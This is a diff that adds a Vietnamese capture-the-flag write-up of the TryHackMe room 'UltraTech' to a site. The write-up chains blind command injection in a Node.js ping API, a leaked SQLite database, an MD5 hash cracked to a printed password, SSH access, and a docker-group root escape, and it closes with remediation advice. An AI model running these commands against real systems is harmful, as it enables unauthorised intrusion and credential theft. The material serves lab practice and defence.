@@ -1,6 +1,6 @@
 ---
 title: 'UltraTech'
-description: '[[THIẾU MÔ TẢ]]'
+description: 'Một API Node.js ẩn chạy ping trên input người dùng (command injection); đọc DB SQLite, crack một mật khẩu, và nhóm docker dẫn tới root.'
 date: 2026-10-05
 platform: tryhackme
 room: 'UltraTech'
@@ -8,8 +8,148 @@ roomUrl: 'https://tryhackme.com/room/ultratech1'
 difficulty: medium
 tags: [web, nodejs, api, command injection, docker, password cracking]
 vulnClasses: [Command Injection, Sensitive Data Exposure, Docker Group Privilege Escalation]
-translation: pending
-draft: true
+translation: done
+draft: false
 ---
 
-Bản dịch tiếng Việt đang được chuẩn bị. Đọc bản tiếng Anh.
+## TryHackMe: UltraTech — Một API ẩn, command injection, và một nhóm Docker
+
+_Lời giải phòng "UltraTech". Một file JavaScript lạc trỏ tới một API Node.js không có tài liệu; một trong các endpoint của nó chạy_ _`ping`_ _trên input người dùng, nghĩa là command injection. Từ đó ta đọc database SQLite của app, crack một mật khẩu, đăng nhập qua SSH, và cưỡi nhóm_ _`docker`_ _thẳng lên root._
+
+> Các giá trị flag đã được che. UltraTech là một phòng luyện tập đã retired trên TryHackMe; mọi thứ ở đây được thực hiện trên một mục tiêu luyện tập được phép.
+
+---
+
+### TL;DR — toàn bộ chuỗi
+
+<Callout type="tldr">
+
+Command injection qua `?ip=` trên một API Node ẩn → đọc `utech.db.sqlite` → crack hash MD5 của `r00t` → SSH vào → nhóm `docker` → **root**.
+
+</Callout>
+
+### Mục tiêu
+
+```text
+export IP=<target-ip>
+nmap -sC -sV -p- -T4 --min-rate=1000 $IP
+```
+
+```text
+21/tcp    open  ftp     vsftpd 3.0.5
+22/tcp    open  ssh     OpenSSH 8.2p1 (Ubuntu)
+8081/tcp  open  http    Node.js Express framework      # CORS: HEAD GET POST PUT DELETE PATCH
+31331/tcp open  http    Apache 2.4.41 (Ubuntu)         # "UltraTech - The best of technology"
+```
+
+Bốn cổng, và cặp thú vị là hai dịch vụ web. Cổng 31331 là site marketing công khai trên Apache. Cổng 8081 là một API Node.js/Express trần trụi với một chính sách CORS dễ dãi thậm chí cho phép `PUT`, `DELETE`, và `PATCH`. FTP và SSH đều cần thông tin đăng nhập ta chưa có, nên web là nơi ta bắt đầu.
+
+### Liệt kê: để site tự kể cho ta về API của nó
+
+Brute-force thư mục trên site chính:
+
+```text
+gobuster dir -u http://$IP:31331/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php,txt,js,html,bak
+```
+
+```text
+css/  images/  javascript/  js/  index.html  partners.html  what.html  robots.txt
+```
+
+Không có gì kịch tính — nhưng phần thưởng nằm trong JavaScript. Đọc JS của site làm lộ một route nói chuyện với API Node ở cổng **8081**, kèm các tham số của nó. Một endpoint nhận một địa chỉ IP và _ping_ nó ở phía server.
+
+Bất cứ khi nào một web app ping một thứ bạn cung cấp, hãy hỏi câu hiển nhiên: giá trị đó có đi thẳng vào một shell không?
+
+### Xác nhận thực thi lệnh ngoài-băng-tần (out-of-band)
+
+Ta không thấy kết quả ping, nên chứng minh việc thực thi bằng một tín hiệu ngoài-băng-tần. Khởi động một bộ bắt gói cho ICMP và trỏ endpoint vào máy của chính ta:
+
+```text
+sudo tcpdump -i tun0 icmp
+# then hit the API with ?ip=<attacker-ip>
+```
+
+```text
+IP <target-ip> > <attacker-ip>: ICMP echo request
+IP <attacker-ip> > <target-ip>: ICMP echo reply
+```
+
+Mục tiêu thật sự ping lại ta, nên tham số đã tới một shell. Đó là một primitive **command injection**: giá trị được ghép vào một lệnh gọi `ping`, và một dấu backtick (`` ` ``) phá ra khỏi nó để chạy lệnh tùy ý.
+
+### Điểm đặt chân: tiêm vào database SQLite
+
+App Express giữ người dùng của nó trong một file SQLite cục bộ, `utech.db.sqlite`. Tiêm một lệnh đọc file đó làm rò rỉ nội dung của nó vào phản hồi, và rơi ra hai tài khoản với hash mật khẩu MD5:
+
+| **User** | **Hash**   |
+| -------- | ---------- |
+| r00t     | [REDACTED] |
+| admin    | [REDACTED] |
+
+MD5 không có salt và nhanh, nên hashcat crack nó trong vài giây:
+
+```text
+echo 'f357a0c52799563c7c7b76c1e7543a32' > hash.txt
+hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+# f357a0c52799563c7c7b76c1e7543a32:n100906
+```
+
+Giờ ta có `r00t` / `n100906`. Cổng SSH từ bản quét bỗng trở nên quan trọng:
+
+```text
+ssh r00t@$IP        # password: n100906
+```
+
+```text
+r00t@ultratech-prod:~$ id
+uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
+```
+
+Đọc user flag từ home của `r00t` (giá trị đã che).
+
+### Leo quyền: nhóm docker chính là root
+
+Nhìn kỹ output `id` đó: `r00t` ở trong nhóm **docker**. Đó thực chất là root, từ thiết kế. Docker daemon chạy với tư cách root, và bất kỳ thành viên nhóm nào cũng có thể khởi động một container mount hệ thống file của host và đưa vào một shell root trên nó. Kiểm tra các image nào tồn tại, rồi dùng một cái:
+
+```text
+docker images
+# REPOSITORY  TAG     ...
+# bash        latest  ...
+
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
+# whoami -> root
+```
+
+- `v /:/mnt` bind-mount root của host vào bên trong container và `chroot /mnt` biến nó thành `/` của ta. Giờ ta là root trên hệ thống file thật — tự do đọc root flag và `/root/.ssh/id_rsa` (giá trị đã che).
+
+<Callout type="note">
+
+Chú ý tên image. Nhiều write-up dùng `alpine`, nhưng máy này chỉ có `bash` ở local, nên chạy `docker images` trước, rồi đổi tên. Bất kỳ image local nào cũng được.
+
+</Callout>
+
+### Mức độ nghiêm trọng
+
+<Callout type="critical">
+
+**Cao.** Một command injection không-xác-thực trong một API với-tới-được-qua-mạng dẫn tới lộ database, chiếm thông tin đăng nhập, và — qua nhóm `docker` — một cú chiếm root hoàn toàn của host. Không cần xác thực và không cần tương tác người dùng để bắt đầu.
+
+</Callout>
+
+### Khắc phục — phá chuỗi ở bất kỳ mắt xích nào
+
+<Callout type="fix">
+
+1. **Command injection** — không bao giờ dựng một lệnh shell từ input người dùng. Dùng một API dạng mảng-tham-số (`execFile`/`spawn` với một danh sách args, không phải `exec` với một chuỗi) và xác thực input với một allow-list IP nghiêm ngặt.
+2. **Lưu mật khẩu** — MD5 không phải một hàm băm mật khẩu. Dùng bcrypt/argon2 với một salt, và đừng đóng gói database bên trong web root.
+3. **Nhóm docker** — đừng thêm người dùng dịch vụ hay đăng nhập vào nó trừ khi họ được tin như root. Ưu tiên rootless Docker hoặc một socket proxy có phạm vi.
+
+</Callout>
+
+### Điểm rút ra
+
+- **Đọc JavaScript.** Toàn bộ bề mặt tấn công — một API thứ hai ở cổng khác — bị ẩn khỏi trang chủ nhưng được nêu rõ trong một file JS.
+- **Chứng minh việc thực thi mù bằng ngoài-băng-tần.** Một `tcpdump` trên ICMP xác nhận một lệnh chạy trước khi bạn tốn thời gian đoán cú pháp tiêm.
+- **Một DB dạng file là chiến lợi phẩm.** Thông tin đăng nhập SQLite chỉ cách một lần đọc command-injection, và MD5 không salt gục tức thì trước `rockyou`.
+- **Nhóm** **`docker`** **== root.** `docker run -v /:/mnt ... chroot /mnt sh` là cú thoát chuẩn — chỉ cần nhớ dùng một image mà máy thật sự có.
+
+Cảm ơn bạn đã đọc. UltraTech là một bài học gọn gàng về việc lần theo manh mối này tới manh mối kế: một file JS tới một API, một API tới một database, một database tới SSH, và một tư cách thành viên nhóm tới root.
